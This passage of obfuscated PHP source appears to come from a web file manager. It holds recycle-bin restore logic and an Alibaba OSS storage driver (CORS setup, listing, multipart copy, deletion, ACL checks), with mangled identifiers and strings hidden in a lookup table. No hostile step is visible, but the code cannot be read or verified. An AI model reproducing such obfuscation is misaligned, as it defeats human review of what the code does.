_restoreSource($Ã³‰˜ì¤, $¤ë¨ıÒ) { $š¸…¶ßö =& $_SERVER[Î·Ü›öğ]; $¯ôÅÄÏ¸ = Model($š¸…¶ßö[1458]); $¤ë¨ıÒ = $¤ë¨ıÒ == !1 ? !1 : $¤ë¨ıÒ; if (!$Ã³‰˜ì¤) { return !0; } $¬ú»Ÿª = array(); foreach ($Ã³‰˜ì¤ as $†€î¼áö) { if ($¤ë¨ıÒ != !1 && !in_array($†€î¼áö, $¤ë¨ıÒ)) { continue; } $¿ÎïîŞ£ = $¯ôÅÄÏ¸->sourceInfo($†€î¼áö); $è€Íä‰‘ = $¯ôÅÄÏ¸->sourceInfo($¿ÎïîŞ£[$š¸…¶ßö[193]]); if ($è€Íä‰‘[$š¸…¶ßö[516]] == $š¸…¶ßö[91]) { continue; } $¯ôÅÄÏ¸->lockMoveStart($†€î¼áö); $this->recycleMove($†€î¼áö, 0); if ($¿ÎïîŞ£[$š¸…¶ßö[496]] == $š¸…¶ßö[91]) { $…˜ø‡·® = array($š¸…¶ßö[668] => array($š¸…¶ßö[628], $¿ÎïîŞ£[$š¸…¶ßö[597]] . $†€î¼áö . $š¸…¶ßö[629])); $¯ôÅÄÏ¸->where($…˜ø‡·®)->setField($š¸…¶ßö[516], 0); $this->restoreFolderChildren($†€î¼áö, $Ã³‰˜ì¤); } $this->where(array($š¸…¶ßö[194] => $†€î¼áö))->delete(); $¯ôÅÄÏ¸->folderSizeReset($¿ÎïîŞ£[$š¸…¶ßö[193]]); $¬ú»Ÿª[] = $¿ÎïîŞ£[$š¸…¶ßö[193]]; if ($¿ÎïîŞ£[$š¸…¶ßö[496]] == $š¸…¶ßö[91]) { $¬ú»Ÿª[] = $†€î¼áö; } $¯ôÅÄÏ¸->lockMoveEnd($†€î¼áö); } $¯ôÅÄÏ¸->updateModifyTime($¬ú»Ÿª); } private function restoreFolderChildren($ùŒöÑæÛ, $¶Ë¬‚Äú) { $ªª­ª„Û =& $_SERVER[Î·Ü›öğ]; $³üˆ¼”¬ = Model($ªª­ª„Û[1458]); $Á¡ö÷à = array($ªª­ª„Û[194] => array($ªª­ª„Û[7], array())); foreach ($¶Ë¬‚Äú as $ï®Æƒ˜) { if ($ï®Æƒ˜ == $ùŒöÑæÛ) { continue; } if (!$³üˆ¼”¬->isParentOf($ùŒöÑæÛ, $ï®Æƒ˜)) { continue; } $ì–çÅ¤· = $³üˆ¼”¬->sourceInfo($ï®Æƒ˜); if ($ì–çÅ¤·[$ªª­ª„Û[496]] == $ªª­ª„Û[91]) { $Á¡ö÷à[] = array($ªª­ª„Û[668] => array($ªª­ª„Û[628], $ì–çÅ¤·[$ªª­ª„Û[597]] . $ï®Æƒ˜ . $ªª­ª„Û[629])); } else { $Á¡ö÷à[$ªª­ª„Û[194]][1][] = $ï®Æƒ˜; } } if (!$Á¡ö÷à[$ªª­ª„Û[194]][1]) { unset($Á¡ö÷à[$ªª­ª„Û[194]]); } if (!$Á¡ö÷à) { return; } if (is_array($Á¡ö÷à[$ªª­ª„Û[194]]) && is_array($Á¡ö÷à[$ªª­ª„Û[194]][1])) { $Á¡ö÷à[$ªª­ª„Û[194]][1] = array_unique($Á¡ö÷à[$ªª­ª„Û[194]][1]); } $Á¡ö÷à[$ªª­ª„Û[1099]] = $ªª­ª„Û[2112]; $³üˆ¼”¬->where($Á¡ö÷à)->setField($ªª­ª„Û[516], 1); } private function recycleMove($§Ñ¿÷¹à, $«€ñÈÒ = 1) { $ø·è‘Õ¾ =& $_SERVER[Î·Ü›öğ]; $¤§İ„‡ü = Model($ø·è‘Õ¾[1458]); $’¹¢ë±Á = Model($ø·è‘Õ¾[2352]); $ãå†¨£ = array($ø·è‘Õ¾[194] => $§Ñ¿÷¹à); if ($«€ñÈÒ) { $¤§İ„‡ü->where($ãå†¨£)->setField($ø·è‘Õ¾[516], 1); $’¹¢ë±Á->eventRecycle($§Ñ¿÷¹à, $ø·è‘Õ¾[2353]); } else { $ü¦ÁÉ‚œ = $¤§İ„‡ü->where($ãå†¨£)->find(); $¨‘‰›ÂÊ = $ü¦ÁÉ‚œ[$ø·è‘Õ¾[496]] == $ø·è‘Õ¾[91]; $­ÊÉÄÆş = $¤§İ„‡ü->fileNameAuto($ü¦ÁÉ‚œ[$ø·è‘Õ¾[193]], $ü¦ÁÉ‚œ[$ø·è‘Õ¾[32]], REPEAT_RENAME_FOLDER, $¨‘‰›ÂÊ); if ($­ÊÉÄÆş != $ü¦ÁÉ‚œ[$ø·è‘Õ¾[32]]) { $¤§İ„‡ü->rename($§Ñ¿÷¹à, $­ÊÉÄÆş); } $¤§İ„‡ü->where($ãå†¨£)->setField($ø·è‘Õ¾[516], 0); $’¹¢ë±Á->eventRecycle($§Ñ¿÷¹à, $ø·è‘Õ¾[2354]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\163\157\165\162\x63\145\123\145\x63\162\x65\x74\114\151\x73\164"; public $field = array("\163\x6f\165\162\x63\x65\111\x44", "\x74\x79\x70\x65\x49\x44", "\x63\x72\x65\141\164\x65\x55\x73\145\x72"); } goto F¡¤ƒÜ¼„†; aŠòˆœ¹‘Á: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ºÖŞüÕÔ) { parent::__construct($ºÖŞüÕÔ); $this->setSignVersion($_SERVER[Î·Ü›öğ][250]); } public function uploadFormData($£‚ÙşÈÛ, $‚ä‰Â­ó = 3600) { return $this->uploadFormDataV2($£‚ÙşÈÛ, $‚ä‰Â­ó); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($úôæ„÷) { parent::__construct(); include_once SDK_DIR . $_SERVER[Î·Ü›öğ][1500]; $this->_init($úôæ„÷); } public function _init($¼…Şˆ¨â) { $’î‚å‹¤ =& $_SERVER[Î·Ü›öğ]; $this->config = $¼…Şˆ¨â; foreach ($¼…Şˆ¨â as $áØÑƒ¾ => $»ÖÀØ¢) { if (isset($this->{$áØÑƒ¾})) { $this->{$áØÑƒ¾} = $»ÖÀØ¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($’î‚å‹¤[1501] . LNG($’î‚å‹¤[1502])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ŞöÃ‡‡ı =& $_SERVER[Î·Ü›öğ]; $êÛÒ¨Àª = new OSS\Model\CorsConfig(); $¼ ÓÏª­ = new OSS\Model\CorsRule(); $¼ ÓÏª­->addAllowedOrigin($ŞöÃ‡‡ı[1503]); $¼ ÓÏª­->addAllowedMethod($ŞöÃ‡‡ı[1504]); $¼ ÓÏª­->addAllowedMethod($ŞöÃ‡‡ı[1505]); $¼ ÓÏª­->addAllowedMethod($ŞöÃ‡‡ı[1506]); $¼ ÓÏª­->addAllowedMethod($ŞöÃ‡‡ı[1507]); $¼ ÓÏª­->addAllowedMethod($ŞöÃ‡‡ı[165]); $¼ ÓÏª­->setMaxAgeSeconds(600); $¼ ÓÏª­->addExposeHeader($ŞöÃ‡‡ı[1508]); $¼ ÓÏª­->addAllowedHeader($ŞöÃ‡‡ı[1503]); $êÛÒ¨Àª->addRule($¼ ÓÏª­); try { $this->client->putBucketCors($this->bucket, $êÛÒ¨Àª); } catch (OSS\Core\OssException $ªûı¡Ëã) { $this->writeLog(__FUNCTION__ . $ŞöÃ‡‡ı[215] . $ªûı¡Ëã->getMessage()); return !1; } return !0; } public function getBucketCors() { $áë™±–û =& $_SERVER[Î·Ü›öğ]; $¹êõåü = null; try { $¹êõåü = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $«Ø¡ ¦) { $this->writeLog(__FUNCTION__ . $áë™±–û[215] . $«Ø¡ ¦->getMessage()); return null; } if (!$¹êõåü || !($¯È¸¯ = $¹êõåü->getRules())) { return null; } $ú›½š¤Ã = $¯È¸¯[0]->getAllowedOrigins(); $°¥Ÿ¹ÒÊ = $¯È¸¯[0]->getAllowedMethods(); $Ş£êæ° = $¯È¸¯[0]->getMaxAgeSeconds(); $‡Ø‰ãúÈ = $¯È¸¯[0]->getExposeHeaders(); $³Êç¼¥Ò = $¯È¸¯[0]->getAllowedHeaders(); return array($áë™±–û[221] => isset($ú›½š¤Ã[0]) ? $ú›½š¤Ã[0] : $áë™±–û[12], $áë™±–û[225] => $°¥Ÿ¹ÒÊ, $áë™±–û[1509] => $Ş£êæ°, $áë™±–û[1510] => isset($‡Ø‰ãúÈ[0]) ? $‡Ø‰ãúÈ[0] : $áë™±–û[12], $áë™±–û[222] => isset($³Êç¼¥Ò[0]) ? $³Êç¼¥Ò[0] : $áë™±–û[12]); } public function isBucketCors() { $ÉóƒŒ× =& $_SERVER[Î·Ü›öğ]; $óóè‘Ğ = $this->getBucketCors(); if (!$óóè‘Ğ || !is_array($óóè‘Ğ)) { return !1; } if ($óóè‘Ğ[$ÉóƒŒ×[221]] != $ÉóƒŒ×[223] || $óóè‘Ğ[$ÉóƒŒ×[222]] != $ÉóƒŒ×[223]) { return !1; } $’ÂÙàº = array_map($ÉóƒŒ×[224], $óóè‘Ğ[$ÉóƒŒ×[225]]); if (!is_array($’ÂÙàº)) { $’ÂÙàº = array(); } $â‡ü¿ş· = array($ÉóƒŒ×[226], $ÉóƒŒ×[227], $ÉóƒŒ×[228], $ÉóƒŒ×[229], $ÉóƒŒ×[230]); $¤ ÊÅìÀ = array_diff($â‡ü¿ş·, $’ÂÙàº); return empty($¤ ÊÅìÀ); } public function mkfile($‘„±Ã˜, $É±Ÿ™ªş = '', $Ê¤¿É½¼ = REPEAT_RENAME) { $ÊÍ½Çí = $this->setContent($‘„±Ã˜, $É±Ÿ™ªş); if ($ÊÍ½Çí !== !1) { return $this->getPathOuter($‘„±Ã˜); } return !1; } public function mkdir($Ò‘£³µÈ, $øâ¾™õ† = REPEAT_SKIP) { if ($øâ¾™õ† && $this->_isFolder($Ò‘£³µÈ)) { return $this->getPathOuter($Ò‘£³µÈ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ò‘£³µÈ)); } catch (OSS\Core\OssException $–àò’é ) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $–àò’é ->getMessage()); return !1; } return $this->getPathOuter($Ò‘£³µÈ); } private function fileList($€ˆå¯„, $…ìıÉÖÅ = '', $ÓøÀ™Ô = 0) { $èÁïï» =& $_SERVER[Î·Ü›öğ]; $€ˆå¯„ = trim($€ˆå¯„, $èÁïï»[8]); $ÛÖ½´¨Ü = empty($€ˆå¯„) && $€ˆå¯„ !== $èÁïï»[231] ? $èÁïï»[12] : $€ˆå¯„ . $èÁïï»[8]; $¸ÔÕ¹î‰ = $èÁïï»[12]; $ƒ”µÆÊû = 1000; $ì¤‡ñÓœ = $”†™ïŒë = array(); while (!0) { check_abort(); $ŠËÊéÀÈ = array($èÁïï»[1511] => $…ìıÉÖÅ, $èÁïï»[1512] => $ÛÖ½´¨Ü, $èÁïï»[1513] => $ƒ”µÆÊû, $èÁïï»[1514] => $¸ÔÕ¹î‰); try { $‰şÚ‡ü© = $this->client->listObjects($this->bucket, $ŠËÊéÀÈ); } catch (OSS\Core\OssException $’ªƒõšŞ) { $this->writeLog(__FUNCTION__ . $èÁïï»[215] . $’ªƒõšŞ->getMessage()); break; } $¸ÔÕ¹î‰ = $‰şÚ‡ü©->getNextMarker(); $‚ÃÎ¹¾˜ = $‰şÚ‡ü©->getObjectList(); $à“‡ÁÍ = $‰şÚ‡ü©->getPrefixList(); foreach ($‚ÃÎ¹¾˜ as $§®¯°) { if ($§®¯°->getKey() == $ÛÖ½´¨Ü) { continue; } $Ûøı‘‹Î = $§®¯°->getKey(); $¹Ó‰ñ¸ = $§®¯°->getSize(); $Ùã‚µš = $§®¯°->getLastModified(); $Ùè¬œå­ = trim($§®¯°->getETag(), $èÁïï»[121]); $ºõ·µ¢ò = $ÓøÀ™Ô ? array($èÁïï»[32] => $Ûøı‘‹Î, $èÁïï»[79] => $¹Ó‰ñ¸, $èÁïï»[207] => strtotime($Ùã‚µš), $èÁïï»[1515] => $Ùè¬œå­) : $Ûøı‘‹Î; $ï¬ò·±Ö = $¹Ó‰ñ¸ == 0 && substr($Ûøı‘‹Î, strlen($Ûøı‘‹Î) - 1, 1) == $èÁïï»[8] ? !0 : !1; $ª€„  = array($èÁïï»[79] => $¹Ó‰ñ¸, $èÁïï»[1516] => $¹Ó‰ñ¸, $èÁïï»[88] => strtotime($Ùã‚µš), $èÁïï»[1517] => $Ùã‚µš, $èÁïï»[1515] => $Ùè¬œå­); $this->cacheMethodInfoSet($Ûøı‘‹Î, $ï¬ò·±Ö, $ª€„ ); if ($ï¬ò·±Ö) { $ì¤‡ñÓœ[] = $Ûøı‘‹Î; continue; } $”†™ïŒë[] = $ºõ·µ¢ò; } foreach ($à“‡ÁÍ as $‹äÁ…¯¹) { $ì¤‡ñÓœ[] = $‹äÁ…¯¹->getPrefix(); $this->cacheMethodInfoSet($‹äÁ…¯¹->getPrefix(), !0); } if ($¸ÔÕ¹î‰ === $èÁïï»[12]) { break; } } $this->cacheMethodInfoSet($€ˆå¯„, !0); return array($èÁïï»[85] => $ì¤‡ñÓœ, $èÁïï»[86] => $”†™ïŒë); } public function listObject($İÉ÷âÇó, $éé¸åöÇ = '') { $øæ®µãË =& $_SERVER[Î·Ü›öğ]; $İÉ÷âÇó = trim($İÉ÷âÇó, $øæ®µãË[8]); $¦§•ÚœÑ = empty($İÉ÷âÇó) && $İÉ÷âÇó !== $øæ®µãË[231] ? $øæ®µãË[12] : $İÉ÷âÇó . $øæ®µãË[8]; $±ß“­Èœ = $øæ®µãË[12]; $¼İ×àé¦ = 1000; $İÍšø‡Ó = $ä¹¶êŠ = array(); while (!0) { check_abort(); $¦û®Ê… = array($øæ®µãË[1511] => $éé¸åöÇ, $øæ®µãË[1512] => $¦§•ÚœÑ, $øæ®µãË[1513] => $¼İ×àé¦, $øæ®µãË[1514] => $±ß“­Èœ); try { $óÊéÖ¥œ = $this->client->listObjects($this->bucket, $¦û®Ê…); } catch (OSS\Core\OssException $Áä‘®—) { $this->writeLog(__FUNCTION__ . $øæ®µãË[215] . $Áä‘®—->getMessage()); break; } $±ß“­Èœ = $óÊéÖ¥œ->getNextMarker(); $ŞŒÉ©¥ = $óÊéÖ¥œ->getObjectList(); foreach ($ŞŒÉ©¥ as $µÈ®Éï¿) { if ($µÈ®Éï¿->getKey() == $¦§•ÚœÑ) { continue; } $©±§¼‘ƒ = $µÈ®Éï¿->getKey(); $‰êéµª = $µÈ®Éï¿->getSize(); $¬¶—íµ° = $‰êéµª == 0 && substr($©±§¼‘ƒ, strlen($©±§¼‘ƒ) - 1, 1) == $øæ®µãË[8] ? !0 : !1; if ($¬¶—íµ°) { continue; } $ä¹¶êŠ[] = $‰êéµª . $øæ®µãË[215] . $©±§¼‘ƒ; } if ($±ß“­Èœ === $øæ®µãË[12]) { break; } } return array($øæ®µãË[85] => $İÍšø‡Ó, $øæ®µãË[86] => $ä¹¶êŠ); } public function copyFile($İñÑê¬·, $¸ÏÀœƒ) { $¶©ıø¾ = $this->size($İñÑê¬·); if ($¶©ıø¾ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $İñÑê¬·, $this->bucket, $this->pathEncode($¸ÏÀœƒ)); } catch (OSS\Core\OssException $–öåã¶) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $–öåã¶->getMessage()); return !1; } return $this->getPathOuter($¸ÏÀœƒ); } $üïßşÅô = $this->multiCopyObject($İñÑê¬·, $¸ÏÀœƒ, $¶©ıø¾); return $üïßşÅô ? $this->getPathOuter($¸ÏÀœƒ) : !1; } private function multiCopyObject($ºø‰ãñÉ, $×¹ŞûßÖ, $ñÙÅé…Ê) { $ªµ€¸¾¨ =& $_SERVER[Î·Ü›öğ]; try { $ÒçÃÔÀù = array(); if ($şá¹ĞŞƒ = $this->hashMd5($ºø‰ãñÉ)) { $ÒçÃÔÀù = array(OSS\OssClient::OSS_HEADERS => array($ªµ€¸¾¨[1518] => $şá¹ĞŞƒ)); } $ßå»°ç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×¹ŞûßÖ), $ÒçÃÔÀù); $ä‰Ò¤ÍÎ = 1; $¬¬Õ¨º‰ = 0; $Šàïã¼· = array(); $ÀÍëÙÙ÷ = 1024 * 1024 * 10; $’‘º¨ºÈ = $this->client->generateMultiuploadParts($ñÙÅé…Ê, $ÀÍëÙÙ÷); foreach ($’‘º¨ºÈ as $ŸŞ£Ö½ => $®ƒ—”„­) { $Ó½¸†Ñ¾ = $¬¬Õ¨º‰ + (int) $®ƒ—”„­[$ªµ€¸¾¨[1519]]; $®›Å”­” = (int) $®ƒ—”„­[$ªµ€¸¾¨[414]] + $Ó½¸†Ñ¾ - 1; $” Õåüî = array($ªµ€¸¾¨[167] => $Ó½¸†Ñ¾, $ªµ€¸¾¨[168] => $®›Å”­”); $Šàïã¼·[] = $this->client->uploadPartCopy($this->bucket, $ºø‰ãñÉ, $this->bucket, $this->pathEncode($×¹ŞûßÖ), $ä‰Ò¤ÍÎ, $ßå»°ç, $” Õåüî); $ä‰Ò¤ÍÎ = $ä‰Ò¤ÍÎ + 1; } $ÄŠéŠ± = array(); foreach ($Šàïã¼· as $ŸŞ£Ö½ => $ÈçÉ®ô¡) { $ÄŠéŠ±[] = array($ªµ€¸¾¨[300] => $ŸŞ£Ö½ + 1, $ªµ€¸¾¨[301] => $ÈçÉ®ô¡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($×¹ŞûßÖ), $ßå»°ç, $ÄŠéŠ±); } catch (OSS\Core\OssException $ş¦êº¦¬) { $this->writeLog(__FUNCTION__ . $ªµ€¸¾¨[215] . $ş¦êº¦¬->getMessage()); return !1; } return !0; } public function moveFile($Ö¼°ø ¾, $ùòà†»í) { if ($this->copyFile($Ö¼°ø ¾, $ùòà†»í)) { $this->remove($Ö¼°ø ¾); return $this->getPathOuter($ùòà†»í); } return !1; } public function delFile($Ç‘èĞ›¨) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ç‘èĞ›¨)); } catch (OSS\Core\OssException $Ñ×•„«¡) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $Ñ×•„«¡->getMessage()); return !1; } return !0; } public function delFolder($«’´ğ®) { $ÌÈ³â‹Ú =& $_SERVER[Î·Ü›öğ]; if (!$this->exist($«’´ğ®)) { return !0; } $this->listItemCache = !1; $£È²¦ãœ = $this->fileList($«’´ğ®); $this->listItemCache = !0; $‘‡çß„› = trim($«’´ğ®, $ÌÈ³â‹Ú[8]) . $ÌÈ³â‹Ú[8]; if (!empty($«’´ğ®) && $«’´ğ® !== $ÌÈ³â‹Ú[231] && !in_array($‘‡çß„›, $£È²¦ãœ[$ÌÈ³â‹Ú[85]])) { $£È²¦ãœ[$ÌÈ³â‹Ú[85]][] = $‘‡çß„›; } $÷Ÿ¤øƒœ = $this->delByBatch($£È²¦ãœ[$ÌÈ³â‹Ú[86]]); if (!$÷Ÿ¤øƒœ) { return !1; } $÷Ÿ¤øƒœ = $this->delByBatch($£È²¦ãœ[$ÌÈ³â‹Ú[85]]); if (!$÷Ÿ¤øƒœ) { return !1; } return $this->delFile($‘‡çß„›); } private function delByBatch($İÀÊÉØª) { foreach (array_chunk($İÀÊÉØª, 1000) as $îïÊèø) { try { $this->client->deleteObjects($this->bucket, $îïÊèø); } catch (OSS\Core\OssException $‡ÁÍâ‘­) { $this->writeLog(__FUNCTION__ . $_SERVER[Î·Ü›öğ][215] . $‡ÁÍâ‘­->getMessage()); return !1; } } return !0; } public function rename($°×Ò¼°, $‹›–¡õ×) { return $this->renameObject($°×Ò¼°, $‹›–¡õ×); } private function fileInfo($ŠÕ˜„òö, $ı£ÇÏ»Ù = false, $–Ö·•‡± = array()) { $ÃÚ¨ÉŸÏ =& $_SERVER[Î·Ü›öğ]; $£ô«¨€ = array($ÃÚ¨ÉŸÏ[32] => $this->pathThis($ŠÕ˜„òö), $ÃÚ¨ÉŸÏ[87] => $this->getPathOuter($ŠÕ˜„òö), $ÃÚ¨ÉŸÏ[33] => $ÃÚ¨ÉŸÏ[233], $ÃÚ¨ÉŸÏ[79] => isset($–Ö·•‡±[$ÃÚ¨ÉŸÏ[79]]) ? $–Ö·•‡±[$ÃÚ¨ÉŸÏ[79]] : 0, $ÃÚ¨ÉŸÏ[169] => $this->ext($ŠÕ˜„òö)); if ($ı£ÇÏ»Ù) { return $£ô«¨€; } $£ô«¨€[$ÃÚ¨ÉŸÏ[234]] = $£ô«¨€[$ÃÚ¨ÉŸÏ[88]] = 0; $£ô«¨€[$ÃÚ¨ÉŸÏ[235]] = $£ô«¨€[$ÃÚ¨ÉŸÏ[236]] = !0; if (empty($–Ö·•‡±)) { $¤Ø«¸¤‹ = $this->objectMeta($ŠÕ˜„òö); if (!$¤Ø«¸¤‹) { return $£ô«¨€; } $–Ö·•‡± = array($ÃÚ¨ÉŸÏ[88] => strtotime($¤Ø«¸¤‹[$ÃÚ¨ÉŸÏ[1517]]), $ÃÚ¨ÉŸÏ[79] => $¤Ø«¸¤‹[$ÃÚ¨ÉŸÏ[1516]] + 0, $ÃÚ¨ÉŸÏ[1515] => $¤Ø«¸¤‹[$ÃÚ¨ÉŸÏ[1515]]); } if (isset($–Ö·•‡±[$ÃÚ¨ÉŸÏ[1515]]) && $–Ö·•‡±[$ÃÚ¨ÉŸÏ[1515]]) { $£ô«¨€[$ÃÚ¨ÉŸÏ[238]] = trim($–Ö·•‡±[$ÃÚ¨ÉŸÏ[1515]], $ÃÚ¨ÉŸÏ[121]); } if (isset($–Ö·•‡±[$ÃÚ¨ÉŸÏ[79]])) { $£ô«¨€[$ÃÚ¨ÉŸÏ[79]] = $–Ö·•‡±[$ÃÚ¨ÉŸÏ[79]]; } if (isset($–Ö·•‡±[$ÃÚ¨ÉŸÏ[88]])) { $£ô«¨€[$ÃÚ¨ÉŸÏ[88]] = $–Ö·•‡±[$ÃÚ¨ÉŸÏ[88]]; } if (isset($–Ö·•‡±[$ÃÚ¨ÉŸÏ[207]]) && !trim($£ô«¨€[$ÃÚ¨ÉŸÏ[88]])) { $£ô«¨€[$ÃÚ¨ÉŸÏ[88]] = $–Ö·•‡±[$ÃÚ¨ÉŸÏ[207]]; } return $£ô«¨€; } private function folderInfo($š’ëõ€, $ñ¾ìÍœê = false, $ŸŒ¡ŞƒÍ = array()) { $Ôì’Æ =& $_SERVER[Î·Ü›öğ]; $’ğÀÔ•ñ = array($Ôì’Æ[32] => $this->pathThis($š’ëõ€), $Ôì’Æ[87] => $this->getPathOuter($Ôì’Æ[8] . $š’ëõ€), $Ôì’Æ[33] => $Ôì’Æ[78]); if ($ñ¾ìÍœê) { return $’ğÀÔ•ñ; } $’ğÀÔ•ñ[$Ôì’Æ[234]] = $’ğÀÔ•ñ[$Ôì’Æ[88]] = 0; $’ğÀÔ•ñ[$Ôì’Æ[235]] = $’ğÀÔ•ñ[$Ôì’Æ[236]] = !0; if (empty($ŸŒ¡ŞƒÍ)) { $š’ëõ€ = rtrim($š’ëõ€, $Ôì’Æ[8]) . $Ôì’Æ[8]; $ñÜØ‚ˆ¿ = $this->objectMeta($š’ëõ€); if (!$ñÜØ‚ˆ¿) { return $’ğÀÔ•ñ; } $ŸŒ¡ŞƒÍ = array($Ôì’Æ[234] => $ñÜØ‚ˆ¿[$Ôì’Æ[588]][$Ôì’Æ[1520]], $Ôì’Æ[88] => strtotime($ñÜØ‚ˆ¿[$Ôì’Æ[1517]])); } if (isset($ŸŒ¡ŞƒÍ[$Ôì’Æ[88]])) { $’ğÀÔ•ñ[$Ôì’Æ[88]] = $ŸŒ¡ŞƒÍ[$Ôì’Æ[88]]; } if (isset($ŸŒ¡ŞƒÍ[$Ôì’Æ[234]])) { $’ğÀÔ•ñ[$Ôì’Æ[234]] = $ŸŒ¡ŞƒÍ[$Ôì’Æ[234]]; } return $’ğÀÔ•ñ; } public function listPath($¶ø‡â¹ú, $€ì·ú‰Ñ = false) { $™ÃóËº³ =& $_SERVER[Î·Ü›öğ]; $İ¢ş•¥ = $this->fileList($¶ø‡â¹ú, $™ÃóËº³[8], !0); foreach ($İ¢ş•¥[$™ÃóËº³[85]] as $”ó£èŒø => $üö÷àÛ¡) { $İ¢ş•¥[$™ÃóËº³[85]][$”ó£èŒø] = $this->folderInfo($üö÷àÛ¡, $€ì·ú‰Ñ, $üö÷àÛ¡); } foreach ($İ¢ş•¥[$™ÃóËº³[86]] as $”ó£èŒø => $üö÷àÛ¡) { $İ¢ş•¥[$™ÃóËº³[86]][$”ó£èŒø] = $this->fileInfo($üö÷àÛ¡[$™ÃóËº³[32]], $€ì·ú‰Ñ, $üö÷àÛ¡); } return $İ¢ş•¥; } protected function infoChildren($êñêÚ, &$Š›ïÖ«İ) { $Æíåî¸Ú =& $_SERVER[Î·Ü›öğ]; $ŒĞĞÜÒ = $this->fileList($êñêÚ, $Æíåî¸Ú[12], !0); $Š›ïÖ«İ[$Æíåî¸Ú[81]] += count($ŒĞĞÜÒ[$Æíåî¸Ú[85]]); $Š›ïÖ«İ[$Æíåî¸Ú[80]] += count($ŒĞĞÜÒ[$Æíåî¸Ú[86]]); foreach ($ŒĞĞÜÒ[$Æíåî¸Ú[86]] as $Êªñûã±) { if (!$Êªñûã± || !$Êªñûã±[$Æíåî¸Ú[79]]) { continue; } $Š›ïÖ«İ[$Æíåî¸Ú[79]] += $Êªñûã±[$Æíåî¸Ú[79]]; } } public function has($­ÈÚ ãõ, $¼Å•ÎïÇ = false, $ÈÉÁÇ±Ï = true) { $şÒ°£Ó =& $_SERVER[Î·Ü›öğ]; $­ÈÚ ãõ = trim($­ÈÚ ãõ, $şÒ°£Ó[8]); $Ô½üïáÊ = empty($­ÈÚ ãõ) && $­ÈÚ ãõ !== $şÒ°£Ó[231] ? $şÒ°£Ó[12] : $­ÈÚ ãõ . $şÒ°£Ó[8]; $›¹ºÁµ = $şÒ°£Ó[12]; $¹¯Ü½ÉÓ = 500; $‰î–¬Í‚ = $Ğ –¹øö = 0; while (!0) { check_abort(); $›ÛÏüÑ = array($şÒ°£Ó[1511] => $şÒ°£Ó[8], $şÒ°£Ó[1512] => $Ô½üïáÊ, $şÒ°£Ó[1513] => $¹¯Ü½ÉÓ, $şÒ°£Ó[1514] => $›¹ºÁµ); try { $ò¿Í­£ = $this->client->listObjects($this->bucket, $›ÛÏüÑ); } catch (OSS\Core\OssException $˜Ü¢ÁÏ‘) { $this->writeLog(__FUNCTION__ . $şÒ°£Ó[215] . $˜Ü¢ÁÏ‘->getMessage()); break; } $›¹ºÁµ = $ò¿Í­£->getNextMarker(); $×ú°ÈëÒ = $ò¿Í­£->getObjectList(); $©¾ÈÕÊ = $ò¿Í­£->getPrefixList(); if ($¼Å•ÎïÇ) { if (count($×ú°ÈëÒ) > 1 || count($×ú°ÈëÒ) == 1 && $×ú°ÈëÒ[0]->getKey() != $Ô½üïáÊ) { $‰î–¬Í‚ += count($×ú°ÈëÒ) - 1; } if (!empty($©¾ÈÕÊ)) { $Ğ –¹øö += count($©¾ÈÕÊ); } if ($›¹ºÁµ === $şÒ°£Ó[12]) { break; } continue; } if ($ÈÉÁÇ±Ï) { if (!empty($×ú°ÈëÒ)) { if (count($×ú°ÈëÒ) > 1 || $×ú°ÈëÒ[0]->getKey() != $Ô½üïáÊ) { return !0; } } } else { if (!empty($©¾ÈÕÊ)) { return !0; } } if ($›¹ºÁµ === $şÒ°£Ó[12]) { break; } } if ($¼Å•ÎïÇ) { return array($şÒ°£Ó[242] => $‰î–¬Í‚, $şÒ°£Ó[243] => $Ğ –¹øö); } return !1; } public function listAll($à¤¤åì) { $äûÏ¥€ =& $_SERVER[Î·Ü›öğ]; $ğ¢„ªş = $this->fileList($à¤¤åì, $äûÏ¥€[12], !0); $¡ÎØŒÕ = array_to_keyvalue($ğ¢„ªş[$äûÏ¥€[86]], $äûÏ¥€[32]); foreach ($ğ¢„ªş[$äûÏ¥€[85]] as $Å­„ö³­) { if (is_string($Å­„ö³­)) { $¡ÎØŒÕ[$Å­„ö³­] = array($äûÏ¥€[79] => 0); } } return $this->listAllFiles($à¤¤åì, $¡ÎØŒÕ); } public function canRead($¹‘˜½£¹) { $øÌãªœ¤ =& $_SERVER[Î·Ü›öğ]; $ÉÈ…ä«æ = $this->pathAcl($¹‘˜½£¹); return $ÉÈ…ä«æ == $øÌãªœ¤[1521] || $ÉÈ…ä«æ == $øÌãªœ¤[635] ? !0 : !1; } public function canWrite($‡Ÿâ–şæ) { $àÁŠÖõ = $this->pathAcl($‡Ÿâ–şæ); return $àÁŠÖõ == $_SERVER[Î·Ü›öğ][635] ? !0 : !1; } public function pathAcl($ÇÁ³Áı‡) { $øİ´Ë¨ =& $_SERVER[Î·Ü›öğ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ŠËÚÈÎ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÇÁ³Áı‡)); } catch (OSS\Core\OssException $õœÇ¥ã) { $this->writeLog(__FUNCTION__ . $øİ´Ë¨[215] . $õœÇ¥ã->getMessage()); return !1; } $·ëïÓÔ = $ŠËÚÈÎ == $øİ´Ë¨[37] ? $this->bucketAcl : $ŠËÚÈÎ; if ($·ëïÓÔ == $øİ´Ë¨[1522]) { return $øİ´Ë¨[1521]; } if ($·ëïÓÔ == 